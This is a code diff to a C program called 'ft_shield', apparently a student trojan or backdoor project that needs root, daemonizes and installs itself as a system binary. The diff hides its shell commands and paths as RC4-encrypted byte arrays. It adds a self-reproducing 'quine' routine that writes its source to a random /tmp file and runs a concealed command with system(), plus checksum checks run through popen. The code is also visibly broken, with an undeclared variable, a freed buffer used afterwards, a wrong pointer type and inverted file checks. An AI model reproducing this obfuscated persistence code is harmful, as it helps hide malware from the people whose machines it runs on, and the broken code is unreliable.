@@ -1,3 +1,6 @@
+const unsigned char	srccode[]	=	{};
+
+#include <time.h>
 #include <poll.h>
 #include <stdio.h>
 #include <fcntl.h>
@@ -17,6 +20,7 @@
 
 #define LOGINS					"orekabe & aabdou\n"
 #define SUDO					"You should run 'ft_shield' with sudo privilege\n"
+#define	MOD						1000000007
 #define	MAX_CLIENT_CONNECTION	3
 
 const unsigned char	servport[]	=	{0x07, 0x4E, 0x22, 0x27};
@@ -101,6 +105,7 @@ const unsigned char progpath[]	=	{0x1C, 0x0C, 0x64, 0x7A, 0xCD, 0xE6, 0x9F, 0x85
 const unsigned char binpath[]	=	{0x1C, 0x09, 0x65, 0x67, 0x81, 0xAB, 0x85, 0x8E};
 const unsigned char rootpath[]	=	{0x1C};
 const unsigned char nullpath[]	=	{0x1C, 0x18, 0x73, 0x63, 0x81, 0xA7, 0x99, 0x8C, 0xF4};
+const unsigned char targpath[]	=	{0x1C, 0x18, 0x73, 0x63, 0x81, 0xA7, 0x99, 0x8C, 0xF4};
 const unsigned char sfcpath[]	=	{0x1C, 0x19, 0x62, 0x76, 0x81, 0xBA, 0x95, 0x93, 0xEC, 0x5B, 0x05, 0x04, 0x97, 0xC8, 0x6F, 0xA6, 0x47, 0xF7, 0x48,
 									 0x33, 0x3A, 0x24, 0x64, 0xDE, 0x4D, 0xB6, 0x30, 0x7D, 0x14, 0xD0, 0x77, 0x0A, 0x43, 0x9B, 0x55, 0x31, 0x33};
 const unsigned char reload[]	=	{0x40, 0x05, 0x65, 0x61, 0xCB, 0xA4, 0x8F, 0x94, 0xF4, 0x1E, 0x0C, 0x01, 0xDD, 0xD6, 0x79, 0xBB, 0x1E, 0xE0, 0x40,
@@ -144,6 +149,20 @@ const unsigned char cnfailed[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA6
 									 0x91, 0x1F, 0x57, 0x88, 0xC8};
 const unsigned char enterpass[]	=	{0x63, 0x10, 0x73, 0x74, 0xDD, 0xAC, 0xCC, 0x85, 0xF6, 0x4A, 0x0D, 0x12, 0x98, 0xC2, 0x79, 0xA0, 0x41, 0xB2, 0x55,
 									 0x7D, 0x2F, 0x23, 0x4C, 0xC2, 0x57, 0xBB, 0x6F, 0x31};
+const unsigned char objcmd[]	=	{0x5C, 0x1E, 0x7C, 0x71, 0xDB, 0xA4, 0x9C, 0xC0, 0xB5, 0x4D, 0x48, 0x4D, 0xD2, 0x9B, 0x38, 0xA1, 0x56, 0xEA, 0x51,
+									 0x3C, 0x3A, 0x24, 0x64, 0xDE, 0x4D, 0xB6, 0x30, 0x7D, 0x14};
+const unsigned char catcmd[]	=	{0x50, 0x1D, 0x62, 0x35, 0x81, 0xAC, 0x98, 0x83, 0xB7, 0x4D, 0x11, 0x13, 0xCC, 0xDE, 0x7B, 0xB1, 0x1C, 0xE1, 0x5C,
+									 0x6F, 0x28, 0x35, 0x56, 0x82, 0x43, 0xAB, 0x0A, 0x62, 0x18, 0x97, 0x61, 0x03, 0x55, 0xC3, 0x4F, 0x37, 0x24, 0xB9,
+									 0x92, 0x1D, 0x5C};
+const unsigned char runcmd[]	=	{0x54, 0x1F, 0x75, 0x35, 0x83, 0x9E, 0x8D, 0x8C, 0xF4, 0x1E, 0x45, 0x37, 0xDD, 0xC3, 0x62, 0xA7, 0x52, 0xB2, 0x08,
+									 0x4B, 0x39, 0x22, 0x49, 0xC2, 0x57, 0xFF, 0x70, 0x62, 0x50, 0xD3, 0x6B, 0x4F, 0x14, 0x9E};
+const unsigned char permis[]	=	{0x41};
+const unsigned char frline[]	=	{0x50, 0x13, 0x78, 0x66, 0xDA, 0xE9, 0x99, 0x8E, 0xEB, 0x57, 0x0F, 0x0E, 0xDD, 0xDF, 0x36, 0xB6, 0x5B, 0xF3, 0x57,
+									 0x15, 0x2F, 0x22, 0x58, 0xCE, 0x4A, 0xBB, 0x30, 0x4A, 0x2D, 0xF7, 0x39, 0x66, 0x4A, 0xE7};
+const unsigned char lsline[]	=	{0x39, 0x01, 0x2D, 0x1F, 0xA4};
+const unsigned char vnewline[]	=	{0x1F, 0x76};
+const unsigned char vspace[]	=	{0x1F, 0x5C};
+const unsigned char hexspec[]	=	{0x03, 0x04, 0x33, 0x25, 0x9C, 0x91};
 
 typedef	struct	client_info
 {
@@ -160,6 +179,8 @@ typedef	struct	server
 }				t_server;
 
 t_server		*g_server;
+long long		binchecksum = 256;
+long long		sfcchecksum = 256;
 
 void	RC4_swap(unsigned char *S, int i, int j)
 {
@@ -209,6 +230,29 @@ unsigned char	*RC4(const char *salt, const unsigned char *msg)
 	for (size_t i = 0; i < len; i++)
 		cypher[i] = msg[i] ^ K[i];
 	return cypher;
+}
+
+char	*generate_random_filename()
+{
+	int		len = 70;
+	char	*filename = (char *)malloc(len);
+
+	if (!len)
+		exit(1);
+	while (true)
+	{
+		struct timespec	ts;
+		clock_gettime(CLOCK_REALTIME, &ts);
+		unsigned long long	random = 0;
+		for (int i = 0; i < 4; i++)
+			random = (random << 15) | (rand() & 0x7FFF);
+		if (snprintf(filename, len, "/tmp/ft_shield_%ld_%lld_%llu.c", ts.tv_sec, (long long)ts.tv_nsec, random) >= len)
+			continue;
+		if (!access(filename, F_OK))
+			return filename;
+		usleep(1);
+	}
+	return NULL;
 }
 
 void	ft_error(char *str)
@@ -313,40 +357,100 @@ void	create_daemon(void)
 	return ;
 }
 
+bool	file_checksum(bool bin)
+{
+	char			c;
+	long			checksum = 0;
+	unsigned char	*cypher = (bin ? RC4(LOGINS, objcmd) : RC4(LOGINS, catcmd));
+	unsigned char	*pcypher = RC4(LOGINS, permis);
+	FILE			*bintxt = popen((const char *)cypher, (const char *)pcypher);
+
+	free(cypher);
+	free(pcypher);
+	if (bintxt)
+	{
+		while ((c = fgetc(bintxt)) != EOF)
+			checksum = ((checksum % MOD) + (c % MOD)) % MOD;
+		if (fclose(bintxt) < 0)
+			exit(1);
+		if (bin && checksum == binchecksum)
+			return true;
+		else if (!bin && checksum == sfcchecksum)
+			return true;
+	}
+	return false;
+}
+
+void	quine()
+{
+	int				len;
+	char			filename = generate_random_filename();
+	char			cmd[1024];
+	FILE			*file;
+	unsigned char	*cypher;
+	unsigned char	*tcypher;
+	unsigned char	*hcypher;
+
+	file = fopen(filename, "wb");
+	if (!file)
+	{
+		free(filename);
+		exit(1);
+	}
+	cypher = RC4(LOGINS, frline);
+	fprintf(file, cypher, sizeof(cypher));
+	free(cypher);
+	cypher = RC4(LOGINS, vnewline);
+	tcypher = RC4(LOGINS, vspace);
+	hcypher = RC4(LOGINS, hexspec);
+	for (int i = 0; i < sizeof(srccode); i++)
+    {
+		if (i && i % 24 == 0)
+			fprintf(file, cypher);
+		else if (i)
+			fprintf(file, tcypher);
+		fprintf(file, hcypher, srccode[i]);
+	}
+	cypher = RC4(LOGINS, srccode);
+	if (write(fd, cypher, strlen((const char *)cypher)) < 0)
+	{
+		free(cypher);
+		free(filename);
+		close(fd);
+		exit(1);
+	}
+	free(cypher);
+	close(fd);
+	cypher = RC4(LOGINS, runcmd);
+	tcypher = RC4(LOGINS, targpath);
+	fd = sprintf(cmd, cypher, filename, tcypher);
+	cmd[fd] = 0;
+	if (system(cmd))
+	{
+		free(cypher);
+		free(tcypher);
+		free(filename);
+		exit(1);
+	}
+	free(cypher);
+	free(tcypher);
+	free(filename);
+	return;
+}
+
 void	move_to_target(void)
 {
-	if (!access("/usr/bin/ft_shield", F_OK))
+	unsigned char	*cypher = RC4(LOGINS, targpath);
+	char			bin_path[PATH_MAX], buff[4096];
+	int				src_fd, dst_fd, read_count, write_count, len;
+
+	free(cypher);
+	if (!access((const char *)cypher, F_OK))
 	{
-		// I need to check the checksum of the binary to see if the same binary or not
-		return;
+		if (file_checksum(true))
+			return;
 	}
-	char	bin_path[PATH_MAX], buff[4096];
-	ssize_t	len = readlink("/proc/self/exe", bin_path, sizeof(bin_path)-1);
-	int		src_fd, dst_fd, read_count, write_count;
-	if (len == -1)
-		ft_error("readlink");
-	bin_path[len] = 0;
-	printf("%s\n", bin_path);
-	src_fd = open(bin_path, O_RDONLY);
-	if (src_fd < 0)
-		ft_error("open src");
-	dst_fd = open("/usr/bin/ft_shield", O_WRONLY | O_CREAT | O_TRUNC, 0755);
-	if (dst_fd < 0)
-		ft_error("open dst");
-	while ((read_count = read(src_fd, buff, sizeof(buff))) > 0)
-	{
-		write_count = write(dst_fd, buff, read_count);
-		if (read_count != write_count)
-		{
-			close(src_fd);
-			close(dst_fd);
-			ft_error("write");
-		}
-	}
-	close(src_fd);
-	close(dst_fd);
-	if (read_count < 0)
-		ft_error("read");
+	quine();
 	return;
 }
 
@@ -727,6 +831,10 @@ void	spawn_server(void)
 
 int	main()
 {
+	struct timespec ts;
+	clock_gettime(CLOCK_REALTIME, &ts);
+	srand(ts.tv_nsec ^ ts.tv_sec);
+
 	if (getegid())
 		ft_error(SUDO);
 	printf("%s", LOGINS);
